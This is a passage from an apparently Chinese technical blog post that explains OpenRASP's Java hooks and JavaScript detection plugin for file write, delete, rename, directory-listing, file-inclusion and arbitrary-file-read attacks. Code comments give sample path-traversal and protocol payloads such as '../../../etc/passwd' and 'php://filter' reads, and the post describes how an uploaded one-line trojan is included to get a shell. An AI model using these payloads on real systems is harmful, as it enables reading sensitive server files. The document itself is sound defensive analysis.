class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.WRITEFILE, params);</span><br></pre></td></tr></table></figure><h4 id="NioFilesWriteHook"><a href="#NioFilesWriteHook" class="headerlink" title="NioFilesWriteHook"></a>NioFilesWriteHook</h4><p>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</p><p>hook类：NioFilesWriteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesWriteHook.class, <span class="string">&quot;checkNioWriteFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createFile&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newOutputStream&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/io/OutputStream;&quot;</span>, src);</span><br><span class="line"><span class="comment">//创建目录  待确认</span></span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createDirectory&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line"><span class="comment">//读写channel,一般不会直接使用，暂不hook</span></span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/util/Set;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesWriteHook#checkNioWriteFile方法）</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> (File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.WRITEFILE, params);   </span><br></pre></td></tr></table></figure><h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><h3 id="OpenRASP检测流程-2"><a href="#OpenRASP检测流程-2" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileDeleteHook"><a href="#FileDeleteHook" class="headerlink" title="FileDeleteHook"></a>FileDeleteHook</h4><p>应用类：java&#x2F;io&#x2F;File</p><p>hook类：FileDeleteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileDeleteHook.class, <span class="string">&quot;checkDeleteFile&quot;</span>, <span class="string">&quot;$0&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;()Z&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileDeleteHook#checkDeleteFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> file.getPath();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, path);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DELETEFILE, params);</span><br></pre></td></tr></table></figure><h4 id="NioFilesDeleteHook"><a href="#NioFilesDeleteHook" class="headerlink" title="NioFilesDeleteHook"></a>NioFilesDeleteHook</h4><p>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</p><p>hook类：NioFilesDeleteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesDeleteHook.class, <span class="string">&quot;checkDeleteFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)V&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;deleteIfExists&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)Z&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesDeleteHook#checkDeleteFile方法）</span></span><br><span class="line">File file=(File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DELETEFILE, params);</span><br></pre></td></tr></table></figure><h2 id="文件重命名漏洞（重命名为webshell）"><a href="#文件重命名漏洞（重命名为webshell）" class="headerlink" title="文件重命名漏洞（重命名为webshell）"></a>文件重命名漏洞（重命名为webshell）</h2><h3 id="OpenRASP检测流程-3"><a href="#OpenRASP检测流程-3" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileRenameHook"><a href="#FileRenameHook" class="headerlink" title="FileRenameHook"></a>FileRenameHook</h4><p>应用类：java&#x2F;io&#x2F;File</p><p>hook类：FileRenameHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileRenameHook.class, <span class="string">&quot;checkFileRename&quot;</span>, <span class="string">&quot;$0,$1&quot;</span>, File.class, File.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;renameTo&quot;</span>, <span class="string">&quot;(Ljava/io/File;)Z&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileRenameHook#checkFileRename方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkFileRename</span><span class="params">(File source, File dest)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (source != <span class="literal">null</span> &amp;&amp; !source.isDirectory() &amp;&amp; dest != <span class="literal">null</span> &amp;&amp; !dest.isDirectory()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        params.put(<span class="string">&quot;source&quot;</span>, source.getAbsolutePath());</span><br><span class="line">        params.put(<span class="string">&quot;dest&quot;</span>, dest.getAbsolutePath());</span><br><span class="line">        HookHandler.doCheck(CheckParameter.Type.RENAME, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="NioFilesRenameHook"><a href="#NioFilesRenameHook" class="headerlink" title="NioFilesRenameHook"></a>NioFilesRenameHook</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesRenameHook.class, <span class="string">&quot;checkFileRename&quot;</span>, <span class="string">&quot;$1,$2&quot;</span>, Object.class, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;copy&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;move&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">srcLinkHard</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesRenameHook.class, <span class="string">&quot;checkFileLink&quot;</span>, <span class="string">&quot;$1,$2,&quot;</span> + <span class="string">&quot;\&quot;hard\&quot;&quot;</span>, Object.class, Object.class,String.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createLink&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;)Ljava/nio/file/Path;&quot;</span>, srcLinkHard);</span><br><span class="line"><span class="type">String</span> <span class="variable">srcLinkSoft</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesRenameHook.class, <span class="string">&quot;checkFileLink&quot;</span>, <span class="string">&quot;$1,$2,&quot;</span> + <span class="string">&quot;\&quot;soft\&quot;&quot;</span>, Object.class, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createSymbolicLink&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;&quot;</span>, srcLinkSoft);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesRenameHook#checkFileRename方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkFileRename</span><span class="params">(Object pathSource, Object pathDest)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    fileSource = (File) Reflection.invokeMethod(pathSource, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">    fileDest = (File) Reflection.invokeMethod(pathDest, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fileSource != <span class="literal">null</span> &amp;&amp; fileDest != <span class="literal">null</span> &amp;&amp; !fileSource.isDirectory() &amp;&amp; !fileDest.isDirectory()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        params.put(<span class="string">&quot;source&quot;</span>, fileSource.getAbsolutePath());</span><br><span class="line">        params.put(<span class="string">&quot;dest&quot;</span>, fileDest.getAbsolutePath());</span><br><span class="line">        HookHandler.doCheck(CheckParameter.Type.RENAME, params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件目录列出"><a href="#文件目录列出" class="headerlink" title="文件目录列出"></a>文件目录列出</h2><h3 id="OpenRASP检测流程-4"><a href="#OpenRASP检测流程-4" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileHook"><a href="#FileHook" class="headerlink" title="FileHook"></a>FileHook</h4><p>应用类：java&#x2F;io&#x2F;File</p><p>hook类：FileHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileHook.class, <span class="string">&quot;checkListFiles&quot;</span>, <span class="string">&quot;$0&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;()[Ljava/lang/String;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileHook#checkListFiles方法）</span></span><br><span class="line">params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DIRECTORY, params);</span><br></pre></td></tr></table></figure><h4 id="NioFilesListHook"><a href="#NioFilesListHook" class="headerlink" title="NioFilesListHook"></a>NioFilesListHook</h4><p>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</p><p>hook类：NioFilesListHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesListHook.class, <span class="string">&quot;checkFileList&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newDirectoryStream&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)Ljava/nio/file/DirectoryStream;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;walk&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;I[Ljava/nio/file/FileVisitOption;)Ljava/util/stream/Stream;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;walkFileTree&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/util/Set;ILjava/nio/file/FileVisitor;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;ILjava/util/function/BiPredicate;[Ljava/nio/file/FileVisitOption;)Ljava/util/stream/Stream;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesListHook#checkFileList方法）</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> (File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DIRECTORY, params);</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>​文件包含漏洞通常出现在由PHP编写的Web应用中，攻击者可以通过PHP中的某些包含函数，去包含一个含有攻击代码的恶意文件，在包含这个文件后，由于PHP包含函数的特性，无论包含的是什么类型的文件，都会将所包含的文件当作PHP代码去解释执行。也就是说，攻击者可能上传一个木马后缀是txt或者jpg的一句话木马，上传后利用文件包含漏洞去包含这个一句话木马文件，就可以成功拿到Shell了。</p><p>​Java中包含其他文件的方式是JSP文件包含，分为静态包含和动态包含两种：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">静态包含：%<span class="meta">@include</span> file=<span class="string">&quot;test.jsp&quot;</span>%</span><br><span class="line">动态包含：&lt;jsp:include page=<span class="string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;/jsp:include&gt;</span><br><span class="line">    &lt;c:<span class="keyword">import</span> url=<span class="string">&quot;&lt;%=url%&gt;&quot;</span>&lt;/c:<span class="keyword">import</span>&gt;</span><br></pre></td></tr></table></figure><p>​动态文件包含中file是可以动态赋值的，可以指向上面说的后缀为txt的一句话木马的路径，但是，Java并不会将非jsp文件当作代码去执行，如果该路径就是.jsp，完全可以直接访问利用，此时不需要文件包含漏洞。可以说，Java文件包含漏洞利用最合适的场景，是某些框架的特性，能把非jsp代码解析成jsp代码去执行。</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="任意文件读取–检测算法"><a href="#任意文件读取–检测算法" class="headerlink" title="任意文件读取–检测算法"></a>任意文件读取–检测算法</h3><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 任意文件下载防护 - 来自用户输入</span></span><br><span class="line"><span class="attr">readFile_userinput</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:       <span class="string">&#x27;算法1 - 用户输入匹配算法&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:     <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">lcs_search</span>: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 使用 file_get_contents 等函数读取 http(s):// 内容（注意，这里不区分是否为内网地址）</span></span><br><span class="line"><span class="attr">readFile_userinput_http</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - 用户输入匹配算法 + http 协议&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 使用 file_get_contents 等函数读取 file://、php:// 协议</span></span><br><span class="line"><span class="attr">readFile_userinput_unwanted</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法3 - 拦截 php:// 等异常协议&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 使用 ../../ 跳出 web 目录读取敏感文件</span></span><br><span class="line"><span class="attr">readFile_outsideWebroot</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法4 - 禁止使用 ../../ 访问web目录以外的文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;ignore&#x27;</span>,</span><br><span class="line">    <span class="attr">reference</span>: <span class="string">&#x27;https://rasp.baidu.com/doc/dev/official.html#case-out-webroot&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 读取敏感文件，最后一道防线</span></span><br><span class="line"><span class="attr">readFile_unwanted</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法5 - 文件探针算法&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;log&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;readFile&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> server    = context.<span class="property">server</span></span><br><span class="line">        <span class="keyword">var</span> is_win    = server.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// weblogic/tongweb 下面，所有war包读取操作全部忽略</span></span><br><span class="line">        <span class="keyword">if</span> (server[<span class="string">&#x27;server&#x27;</span>] === <span class="string">&#x27;weblogic&#x27;</span> || server[<span class="string">&#x27;server&#x27;</span>] == <span class="string">&#x27;tongweb&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.war&#x27;</span>) || params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ear&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> clean;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取协议，如果有</span></span><br><span class="line">    <span class="keyword">var</span> path_parts = params.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&#x27;://&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> proto = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (path_parts.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            proto = path_parts[<span class="number">0</span>].<span class="title function_">toLowerCase</span>()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 算法1: 简单用户输入识别，拦截任意文件下载漏洞</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 不影响正常操作，e.g</span></span><br><span class="line">    <span class="comment">// ?path=download/1.jpg</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ?path=/etc/./hosts</span></span><br><span class="line">            <span class="comment">// ?path=../../../etc/passwd</span></span><br><span class="line">            <span class="keyword">if</span> ( (proto == <span class="string">&quot;&quot;</span> || proto == <span class="string">&quot;file&quot;</span> ) &amp;&amp;</span><br><span class="line">                !readFileWhiteExt.<span class="title function_">test</span>(params.<span class="property">realpath</span>) &amp;&amp;</span><br><span class="line">                <span class="title function_">is_path_endswith_userinput</span>(all_parameter, params.<span class="property">path</span>, params.<span class="property">realpath</span>, is_win, algorithmConfig.<span class="property">readFile_userinput</span>.<span class="property">lcs_search</span>)</span><br><span class="line">               )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - Downloading files specified by userinput, file is %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                    <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                    <span class="attr">algorithm</span>: <span class="string">&#x27;readFile_userinput&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// @<span class="doctag">FIXME:</span> 用户输入匹配了两次，需要提高效率</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_from_userinput</span>(all_parameter, params.<span class="property">path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. 读取 http(s):// 内容</span></span><br><span class="line">            <span class="comment">// ?file=http://www.baidu.com</span></span><br><span class="line">            <span class="keyword">if</span> (proto === <span class="string">&#x27;http&#x27;</span> || proto === <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_userinput_http</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_userinput_http</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting http/https resource with file streaming functions, URL is %1%&quot;</span>, [params.<span class="property">path</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_userinput_http&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 读取特殊协议内容</span></span><br><span class="line">            <span class="comment">// ?file=file:///etc/passwd</span></span><br><span class="line">            <span class="comment">// ?file=php://filter/read=convert.base64-encode/resource=XXX</span></span><br><span class="line">            <span class="keyword">if</span> (proto === <span class="string">&#x27;file&#x27;</span> || proto === <span class="string">&#x27;php&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_userinput_unwanted</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_userinput_unwanted</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - Requesting unwanted protocol %1%://&quot;</span>, [proto]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_userinput_unwanted&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 算法2: 文件、目录探针</span></span><br><span class="line">    <span class="comment">// 如果应用读取了列表里的文件，比如 /root/.bash_history，这通常意味着后门操作</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">readFile_unwanted</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> realpath_lc = params.<span class="property">realpath</span>.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; forcefulBrowsing.<span class="property">absolutePaths</span>.<span class="property">length</span>; j ++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (forcefulBrowsing.<span class="property">absolutePaths</span>[j] == realpath_lc) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_unwanted</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;WebShell activity - Accessing sensitive file %1%&quot;</span>, [params.<span class="property">realpath</span>]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_unwanted&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 算法3: 检查文件遍历，看是否超出web目录范围 [容易误报~]</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> ( (proto == <span class="string">&quot;&quot;</span> || proto == <span class="string">&quot;file&quot;</span> ) &amp;&amp; algorithmConfig.<span class="property">readFile_outsideWebroot</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> path        = params.<span class="property">path</span></span><br><span class="line">            <span class="keyword">var</span> appBasePath = context.<span class="property">appBasePath</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">is_outside_webroot</span>(appBasePath, params.<span class="property">realpath</span>, path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">action</span>:     algorithmConfig.<span class="property">readFile_outsideWebroot</span>.<span class="property">action</span>,</span><br><span class="line">                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;Path traversal - accessing files outside webroot (%1%), file is %2%&quot;</span>, [appBasePath, params.<span class="property">realpath</span>]),</span><br><span class="line">                    <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                    <span class="attr">algorithm</span>:  <span class="string">&#x27;readFile_outsideWebroot&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件读取扩展名白名单，包含 压缩文件 office文件 图片文件</span></span><br><span class="line"><span class="keyword">var</span> readFileWhiteExt = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span 